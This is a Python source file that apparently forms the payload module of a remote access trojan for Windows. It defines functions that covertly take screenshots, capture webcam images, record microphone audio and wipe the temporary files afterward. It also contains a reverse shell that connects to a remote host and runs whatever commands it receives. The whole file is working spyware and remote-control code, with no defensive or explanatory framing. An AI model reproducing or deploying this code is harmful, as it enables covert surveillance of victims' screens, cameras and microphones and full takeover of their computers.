from PIL import ImageGrab
from PIL import Image
import cStringIO
import cv2
import numpy.core.multiarray

import pyaudio
import wave
import ctypes
import socket
import os
import subprocess


def msgbox (m):
	MessageBox = ctypes.windll.user32.MessageBoxA
	MessageBox(None, m, 'Window', 0)


def screenshot (q):
	i = cStringIO.StringIO()
	img=ImageGrab.grab()
	img.save (i, format="JPEG", quality=q)
	str_img = i.getvalue()
	return str_img


def camera (q, cam_n=0):
	filename = str(os.environ['TEMP']) + "00.jpg"
	ramp_frames = 30
	camera = cv2.VideoCapture(cam_n)
	for i in xrange(ramp_frames):
		retval, im = camera.read()
		temp = im
	retval, im = camera.read()
	camera_capture = im
	cv2.imwrite(filename, camera_capture)
	del(camera)

	i = cStringIO.StringIO()
	img = Image.open(filename) 
	img.save(i, format="JPEG", quality= q)
	str_img = i.getvalue()

	f = open(filename,"wb"); f.write ("\x00"*5000000); f.close()
	os.remove(filename) 
	return str_img



def audio_record (quality, time):
	try:	 
		FORMAT = pyaudio.paInt16
		CHANNELS = 1
		CHUNK = 1024
		RECORD_SECONDS = int(time)

		if quality == "1":
			RATE = 11025
		elif quality  == "2":
			RATE = 22050
		elif quality  == "3":
			RATE = 44100
		else: 
			RATE = 22050

		WAVE_OUTPUT_FILENAME = str(os.environ['TEMP']) + "0.log"
		 
		audio = pyaudio.PyAudio()
		 
		# start Recording
		stream = audio.open(format=FORMAT, channels=CHANNELS,
		                rate=RATE, input=True,
		                frames_per_buffer=CHUNK)
		frames = []
		 
		for i in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
		    data = stream.read(CHUNK)
		    frames.append(data)
		 
		
		# stop Recording
		stream.stop_stream()
		stream.close()
		audio.terminate()
		 
		waveFile = wave.open(WAVE_OUTPUT_FILENAME, "wb")
		waveFile.setnchannels(CHANNELS)
		waveFile.setsampwidth(audio.get_sample_size(FORMAT))
		waveFile.setframerate(RATE)
		waveFile.writeframes(b''.join(frames))
		waveFile.close()

		f = open(WAVE_OUTPUT_FILENAME,"rb")
		f_audio = f.read()
		f.close()

		f = open(WAVE_OUTPUT_FILENAME,"wb"); 
		f.write ("\x00"*len(f_audio)*2); 
		f.close()

		os.remove(WAVE_OUTPUT_FILENAME)

		return f_audio

	except:
		return "<_ERROR_>"



def reverse_shell (host, port):
	try:
		rs = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		rs.connect((host, int(port)))
		while 1:
			rs.send("\n" + os.getcwd() + "$ ")
			data = rs.recv(10240)

			try:
				if data.split()[0] == "exit":
					break

				elif data.split()[0] == 'cd':
					cf = data [ len(data.split()[0]) + 1 : ]
					try: os.chdir( cf.replace("\n", "") ); rs.send (" ")
					except Exception, e: rs.send (str(e))

				else:
					proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
					stdout_value = proc.stdout.read() + proc.stderr.read()
					rs.send(stdout_value)

			except:
				rs.send("Wrong command.\n")
		rs.close()
	except:
		pass

########################################################################################################










